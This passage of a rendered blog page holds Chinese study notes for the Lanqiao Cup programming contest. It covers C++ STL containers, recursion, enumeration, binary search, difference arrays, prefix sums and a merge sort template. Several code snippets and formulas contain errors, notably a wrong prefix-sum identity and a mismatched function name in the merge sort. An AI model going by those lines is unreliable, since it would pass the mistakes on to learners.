class=\"token punctuation\">,</span> greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> q<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>stack<span class=\"token punctuation\">,</span> 栈</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  向栈顶插入一个元素</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回栈顶元素</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  弹出栈顶元素</pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>deque<span class=\"token punctuation\">,</span> 双端队列</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token function\">front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">pop_front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>set<span class=\"token punctuation\">,</span> map<span class=\"token punctuation\">,</span> multiset<span class=\"token punctuation\">,</span> multimap<span class=\"token punctuation\">,</span> 基于平衡二叉树（红黑树），动态维护有序序列</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token operator\">++</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">--</span> 返回前驱和后继，时间复杂度 <span class=\"token function\">O</span><span class=\"token punctuation\">(</span>logn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    set<span class=\"token operator\">/</span>multiset</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  插入一个数</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  查找一个数</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回某一个数的个数</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token function\">erase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> 输入是一个数x，删除所有x   <span class=\"token function\">O</span><span class=\"token punctuation\">(</span>k <span class=\"token operator\">+</span> logn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> 输入一个迭代器，删除这个迭代器</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token function\">lower_bound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">upper_bound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>            <span class=\"token function\">lower_bound</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>  返回大于等于x的最小的数的迭代器</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token function\">upper_bound</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>  返回大于x的最小的数的迭代器</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    map<span class=\"token operator\">/</span>multimap</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  插入的数是一个pair</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token function\">erase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  输入的参数是pair或者迭代器</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  注意multimap不支持此操作。 时间复杂度是 <span class=\"token function\">O</span><span class=\"token punctuation\">(</span>logn<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token function\">lower_bound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">upper_bound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>unordered_set<span class=\"token punctuation\">,</span> unordered_map<span class=\"token punctuation\">,</span> unordered_multiset<span class=\"token punctuation\">,</span> unordered_multimap<span class=\"token punctuation\">,</span> 哈希表</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    和上面类似，增删改查的时间复杂度是 <span class=\"token function\">O</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    不支持 <span class=\"token function\">lower_bound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">upper_bound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>， 迭代器的<span class=\"token operator\">++</span>，<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>bitset<span class=\"token punctuation\">,</span> 圧位</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">10000</span><span class=\"token operator\">></span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token operator\">~</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">|</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">^</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token operator\">>></span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;&lt;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token operator\">==</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">!=</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回有多少个<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token function\">any</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  判断是否至少有一个<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token function\">none</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  判断是否全为<span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  把所有位置成<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token function\">set</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>  将第k位变成v</pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    <span class=\"token function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  把所有位变成<span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  等价于<span class=\"token operator\">~</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> 把第k位取反</pre></td></tr></table></figure><h1 id=\"蓝桥杯备赛\"><a class=\"anchor\" href=\"#蓝桥杯备赛\">#</a> 蓝桥杯备赛</h1>\n<p>直接刷题，官方第一期（差分，前缀和，单调队列）第二期第三期模拟题</p>\n<p>关键：刷针对性的题（字符串，大数计算，全排列，递归，回溯）</p>\n<p><code>搜索(DFS、BFS)，DP记忆化搜索，树状数组，二分，前缀和，差分</code></p>\n<p>多做原题思维题，<strong>洛谷黄题绿题</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vaS13aWtpLm9yZw==\">https://oi-wiki.org/</span></p>\n<h1 id=\"递归\"><a class=\"anchor\" href=\"#递归\">#</a> 递归</h1>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240223210102890.png&quot; alt=&quot;image-20240223210102890&quot; style=&quot;zoom: 80%;&quot; /&gt;</p>\n<p><em><strong>自己调用自己</strong></em>，最重要的是<strong>顺序</strong>（DFS 也是）</p>\n<p>从 1 到 n 依次考虑每个数选或者不选</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    f<span class=\"token punctuation\">&#123;</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>scanf printf（<span class=\"token operator\">>=</span><span class=\"token number\">10</span>的<span class=\"token number\">5</span>次方）：稍微长点，速度巨快</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>cin cout（<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span>的<span class=\"token number\">5</span>次方）：稍微短点，速度巨慢 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>常用头文件</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;cstdio></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;cstring></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;algorithm></span></span></pre></td></tr></table></figure><p><strong>斐波那契数列</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;cstring></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;cstdio></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    cin <span class=\"token operator\">>></span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>分析方式</strong>：所有递归 =&gt; 递归搜索树</p>\n<p>向下递归 + 向上回溯</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240114184719472.png\" alt=\"image-20240114184719472\" /></p>\n<p><strong>需要牢记的知识</strong></p>\n<p>2^1 —— 2^10</p>\n<p>2^20 ≈ 100 万</p>\n<p>2^16 = 65536</p>\n<p>2^15 = 32768</p>\n<p>2^63 ≈ 10^18</p>\n<p>从时间复杂度入手猜测解题算法</p>\n<h2 id=\"指数型枚举\"><a class=\"anchor\" href=\"#指数型枚举\">#</a> 指数型枚举</h2>\n<p><strong>acwing92</strong></p>\n<p>每次两个分支，选 / 不选（位数变化）</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240114201307669.png\" alt=\"image-20240114201307669\" /></p>\n<h2 id=\"排列型枚举\"><a class=\"anchor\" href=\"#排列型枚举\">#</a> 排列型枚举</h2>\n<p><strong>acwing94</strong></p>\n<p>按照<strong>字典序</strong>，字典序较小的排在前面</p>\n<ol>\n<li>依次枚举每个数放到哪个位置</li>\n<li>依次枚举每个位置放哪个数</li>\n</ol>\n<p>深度优先搜索 DFS</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240203095347456.png\" alt=\"image-20240203095347456\" /></p>\n<h2 id=\"组合型枚举\"><a class=\"anchor\" href=\"#组合型枚举\">#</a> 组合型枚举</h2>\n<p><strong>acwing93</strong></p>\n<p>数字<strong>不考虑字典序位次</strong>顺序，需要按<strong>前后大小顺序</strong>排列（局部比较处理）</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240220233722294.png\" alt=\"image-20240220233722294\" /></p>\n<p>参数：</p>\n<ol>\n<li>存三个位置的数组 way [i]</li>\n<li>当前枚举到的<strong>位置</strong> u（m 位中的某个位置）</li>\n<li>当前可以枚举的最小数 start（n 个数中的后续未被选的数）</li>\n</ol>\n<p><strong>剪枝策略</strong>：当选了 u-1 个数时，此时枚举到第 u 个数，如果后续 start 到 n 的所有数都被选上仍不足以组合成 m 位，就进行剪枝</p>\n<h1 id=\"二分\"><a class=\"anchor\" href=\"#二分\">#</a> 二分</h1>\n<p>能否二分的界定标准：状态的决策过程或者序列是否满足<strong>单调性</strong>或者可以<strong>局部舍弃性</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CDesktop%5CWorkSpace%5CLanQiaoBei%5Cimages%5Cerfen.png\" alt=\"erfen\" /></p>\n<h1 id=\"差分\"><a class=\"anchor\" href=\"#差分\">#</a> 差分</h1>\n<p>当数组 <code>[l，r]</code>  区间内的值都需要更新（<strong>传统暴力</strong>）时，一个一个更新很耗费时间，所以差分数组可以在 <code>a[l]，a[r+1]</code>  处进行修改，例如区间内每个值要加一，则可以实现为 <code>a[l]++</code> ， <code>a[r+1]--</code>  ，进行一次前缀和</p>\n<p>原数组 <code>a[]</code>  是差分数组 <code>b[]</code>  的前缀和，原数组每次更新状态时，与之对应状态的差分数组求和即可，所以差分数组就可以写成 &lt;u&gt; 前后两个状态的原数组的差值 &lt;/u&gt;；</p>\n<p>同时原数组接下来的 &lt;u&gt; 每一个状态 &lt;/u &gt; 都会因为这个 &lt; u &gt; 前置状态的改变而改变 &lt;/u&gt;，当出现了前置状态变化，需要对原数组 <code>a[s,t]</code>  以及差分数组区间 <code>b[s,t]</code>  每个值逐步更新时，观察规律，只需改变差分数组 <code>b[s]++d</code>  和 <code>b[t]--d</code> ，即可完成状态更替，再通过差分数组求得其<strong>前缀和</strong>，也就是原数组</p>\n<p>差分数组和为 0，正数负数可以相加抵消</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CDesktop%5CWorkSpace%5CLanQiaoBei%5Cimages%5Cchafen.png\" alt=\"chafen\" /></p>\n<h1 id=\"前缀和\"><a class=\"anchor\" href=\"#前缀和\">#</a> 前缀和</h1>\n<p>用数列去理解</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>S<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>S<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>S<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>k<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>所以可以推出：若想求 <code>区间L至R</code>  的长度，即 <code>L-R</code> ， <code>L-R=S[R]-S[L]=a[R]-a[L]</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>S<span class=\"token punctuation\">[</span>L<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span>L<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>S<span class=\"token punctuation\">[</span>R<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span>L<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span>L<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">[</span>R<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h1 id=\"贪心\"><a class=\"anchor\" href=\"#贪心\">#</a> 贪心</h1>\n<h1 id=\"排序\"><a class=\"anchor\" href=\"#排序\">#</a> 排序</h1>\n<p>STL 库封装</p>\n<h2 id=\"归并排序\"><a class=\"anchor\" href=\"#归并排序\">#</a> 归并排序</h2>\n<p>建立在归并操作上的一种有效的排序算法，该算法是采用 <code>分治法</code> 的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即 <code>先使每个子序列有序，再使子序列段间有序</code> 。</p>\n<p><strong>步骤</strong></p>\n<ol>\n<li><strong>分</strong>：先递归将数组分成 <code>只有一个元素</code> 的有序数组</li>\n<li><strong>治</strong>：合二为一：将两个有序数组合并成一个有序数组（就是 <code>二路归并</code> ）</li>\n</ol>\n<p><strong>模板</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;bits/stdc++.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> N <span class=\"token operator\">=</span> <span class=\"token number\">100010</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">[</span>N<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> tmp<span class=\"token punctuation\">[</span>N<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> l<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>l <span class=\"token operator\">==</span> r<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">int</span> mid <span class=\"token operator\">=</span> l <span class=\"token operator\">+</span> r <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 分</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">mergesort</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">mergesort</span><span class=\"token punctuation\">(</span>mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">// 治（合并）</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">//tmp 数组临时存放我们合并的有序序列</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">//i 是第一个序列的头，j 是第二个序列的头</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> l<span 